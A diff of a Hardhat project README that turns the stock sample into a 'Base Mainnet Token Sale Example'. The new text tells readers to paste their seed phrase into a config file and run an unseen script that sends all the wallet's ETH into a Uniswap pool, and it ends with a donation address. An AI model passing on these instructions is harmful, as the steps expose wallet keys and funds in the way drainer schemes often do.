@@ -1,13 +1,16 @@
-# Sample Hardhat Project
+# Base Mainnet Token Sale Example
 
-This project demonstrates a basic Hardhat use case. It comes with a sample contract, a test for that contract, and a Hardhat Ignition module that deploys that contract.
+This script deploys a token on Base Mainnet, deploys an Uniswap V2 liquidity pool with all the ETH balance in your wallet, and then returns the token address in the terminal. It uses Infura gas API to fetch the best fees to prevent transaction from being dropped.
 
-Try running some of the following tasks:
+Simply replace "SEED PHRASE HERE" with your seed phrase (wallet must have Base ETH) in hardhat.config.ts and then run:
+
+
 
 ```shell
-npx hardhat help
-npx hardhat test
-REPORT_GAS=true npx hardhat test
-npx hardhat node
-npx hardhat ignition deploy ./ignition/modules/Lock.ts
+yarn install
+yarn run hardhat run scripts/dynamicfee.ts --network base
 ```
+
+You will be asked questions like name, symbol, initialSupply and then after some waiting you will be given a token address. You can search for your pair on uniswap page.
+
+If this script helped you don't hesitate to donate to 0xB763F010126f95dFF6B76A0F5F4D5f85107C2E99
